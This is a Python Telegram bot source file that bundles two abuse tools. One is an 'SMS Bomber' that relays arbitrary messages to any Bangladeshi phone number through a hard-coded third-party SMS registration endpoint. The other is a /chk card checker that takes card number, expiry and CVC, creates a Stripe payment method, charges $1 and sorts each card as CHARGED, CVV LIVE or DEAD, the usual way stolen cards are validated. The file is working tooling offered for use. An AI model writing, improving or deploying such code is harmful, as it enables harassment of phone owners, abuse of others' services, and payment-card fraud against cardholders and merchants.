import telebot
from telebot import types
import requests
import json
from keep_alive import keep_alive

bot = telebot.TeleBot('Bot Token') # বট টোকেন দিবেন 😐
user_states = {}

# Delete webhook if it exists
bot.remove_webhook()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    full_name = f"{message.from_user.first_name} {message.from_user.last_name or ''}"
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    bomb = types.KeyboardButton("BOMB💣")
    keyboard.add(bomb)
    bot.reply_to(message, f"Welcome, {full_name}! \n Simple SMS Bomber Bot By : @team_dccs \nChoose an option from below ", reply_markup=keyboard)

@bot.message_handler(func=lambda message: True)
def msg_all(message):
    chat_id = message.chat.id
    user_data = user_states.get(chat_id, None)

    if message.text == "BOMB💣":
        bot.reply_to(message, "Enter your number \nWithout (+88) ")
        user_states[chat_id] = {"state": "waiting_for_number"}
        bot.register_next_step_handler(message, process_number)
    elif user_data and user_data["state"] == "waiting_for_number":
        process_number(message)

def process_number(message):
    chat_id = message.chat.id
    user_data = user_states.get(chat_id, None)
    number = message.text
    if number.isdigit() and len(number) == 11:  # Check if the number is 11 digits
        user_data["number"] = number
        user_data["state"] = "waiting_for_message"
        bot.send_message(chat_id, "Enter the message")
        bot.register_next_step_handler(message, process_message)
    else:
        bot.send_message(chat_id, "Number isn't valid. Please enter a valid 11-digit number.")

def process_message(message):
    chat_id = message.chat.id
    user_data = user_states.get(chat_id, None)
    msg = message.text
    number = user_data.get("number")

    if number and msg:
        bot.send_message(chat_id, f"Please wait, sending message to +88{number}")
        api_url = "http://202.51.182.198:8181/nbp/sms/code"
        headers = {
            "Authorization": "Bearer",
            "Language": "en",
            "Timezone": "Asia/Dhaka",
            "Content-Type": "application/json; charset=utf-8",
            "Content-Length": "137",
            "Host": "202.51.182.198:8181",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36"
        }
        data = json.dumps({
            "receiver": number,
            "text": msg,
            "title": "Register Account"
        })
        response = requests.post(api_url, headers=headers, data=data)
        response_text = response.text

        if "request.over.max.count" in response_text:
            bot.send_message(chat_id, "Please try again later ⚠️")
        elif "operate.success" in response_text:
            bot.send_message(chat_id, "SMS sent successfully ✅")
        else:
            bot.send_message(chat_id, "An error occurred while sending the message.")

        user_states.pop(chat_id, None)
    else:
        bot.send_message(chat_id, "Unknown bug. Please try again.")

@bot.message_handler(commands=['chk'])
def check_card(message):
    chat_id = message.chat.id
    card_data = message.text.split()[1:]  # Get the card data from the command
    if card_data:
        results = []
        for card in card_data:
            result = check_card_details(card)
            results.append(result)
        for result in results:
            bot.send_message(chat_id, result)
    else:
        bot.send_message(chat_id, "Please provide card details in the format: /chk cc|mm|yy|cvc")

def check_card_details(card):
    card_parts = card.split('|')
    if len(card_parts) != 4:
        return f"Invalid card format: {card}"

    cc, mes, ano, cvv = card_parts
    if len(mes) == 1:
        mes = "0" + mes
    if len(ano) == 2:
        ano = "20" + ano

    # Replace this with your actual secret key
    sk = "YOUR_SECRET_KEY"

    # 1st Request
    api_url_1 = "https://api.stripe.com/v1/payment_methods"
    headers = {
        "Authorization": f"Bearer {sk}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data_1 = {
        "type": "card",
        "card[number]": cc,
        "card[exp_month]": mes,
        "card[exp_year]": ano,
        "card[cvc]": cvv
    }
    response_1 = requests.post(api_url_1, headers=headers, data=data_1)
    result_1 = response_1.json()

    if "rate_limit" in response_1.text:
        return "Rate limit exceeded, please try again later."

    tok1 = result_1.get("id")
    if not tok1:
        return f"Failed to get token for card: {card}"

    # 2nd Request
    api_url_2 = "https://api.stripe.com/v1/payment_intents"
    data_2 = {
        "amount": 100,  # Amount in cents
        "currency": "usd",
        "payment_method_types[]": "card",
        "description": "Custom Donation",
        "payment_method": tok1,
        "confirm": "true",
        "off_session": "true"
    }
    response_2 = requests.post(api_url_2, headers=headers, data=data_2)
    result_2 = response_2.json()

    if "rate_limit" in response_2.text:
        return "Rate limit exceeded, please try again later."

    if "seller_message" in result_2 and result_2["seller_message"] == "Payment complete.":
        receipt_url = result_2.get("receipt_url", "No receipt URL")
        return f"CHARGED: {card}\nResponse: $1 Charged ✅\nReceipt: {receipt_url}"
    elif "cvc_check" in result_2 and result_2["cvc_check"] == "pass":
        return f"CVV LIVE: {card}"
    elif "cvc_check" in result_2 and result_2["cvc_check"] == "fail":
        return f"Security code is incorrect: {card}"
    elif "generic_decline" in result_2 or "generic_decline" in response_1.text:
        return f"DEAD: {card}\nResult: GENERIC DECLINED"
    elif "insufficient_funds" in result_2:
        return f"CVV: {card}\nResult: INSUFFICIENT FUNDS"
    elif "fraudulent" in result_2:
        return f"DEAD: {card}\nResult: FRAUDULENT"
    elif "do_not_honor" in result_2 or "do_not_honor" in response_1.text:
        return f"DEAD: {card}\nResult: DO NOT HONOR"
    elif "incorrect_cvc" in result_2 or "invalid_cvc" in response_1.text:
        return f"CCN: {card}\nResult: Security code is incorrect"
    elif "invalid_expiry_month" in response_1.text:
        return f"DEAD: {card}\nResult: INVALID EXPIRY MONTH"
    elif "invalid_account" in result_2:
        return f"DEAD: {card}\nResult: INVALID ACCOUNT"
    elif "lost_card" in result_2:
        return f"DEAD: {card}\nResult: LOST CARD"
    elif "stolen_card" in result_2:
        return f"DEAD: {card}\nResult: STOLEN CARD"
    elif "transaction_not_allowed" in result_2:
        return f"CVV: {card}\nResult: TRANSACTION NOT ALLOWED"
    elif "authentication_required" in result_2 or "card_error_authentication_required" in response_1.text:
        return f"CVV: {card}\nResult: 3DS REQUIRED"
    elif "pickup_card" in result_2:
        return f"DEAD: {card}\nResult: PICKUP CARD"
    elif "Your card has expired." in result_2:
        return f"DEAD: {card}\nResult: EXPIRED CARD"
    elif "card_decline_rate_limit_exceeded" in result_2:
        return f"DEAD: {card}\nResult: SK IS AT RATE LIMIT"
    elif "processing_error" in result_2:
        return f"DEAD: {card}\nResult: PROCESSING ERROR"
    elif "Your card number is incorrect." in result_2 or "incorrect_number" in response_1.text:
        return f"DEAD: {card}\nResult: YOUR CARD NUMBER IS INCORRECT"
    elif "service_not_allowed" in result_2:
        return f"DEAD: {card}\nResult: SERVICE NOT ALLOWED"
    elif "card_not_supported" in result_2:
        return f"DEAD: {card}\nResult: CARD NOT SUPPORTED"
    elif "testmode_charges_only" in response_1.text:
        return f"DEAD: {card}\nResult: SK KEY DEAD OR INVALID"
    elif "api_key_expired" in response_1.text:
        return f"DEAD: {card}\nResult: SK KEY REVOKED"
    elif "parameter_invalid_empty" in response_1.text:
        return f"DEAD: {card}\nResult: ENTER CC TO CHECK"

    return f"DEAD: {card}\nResult: {response_2.text}"

if __name__ == "__main__":
    keep_alive()
    bot.polling()
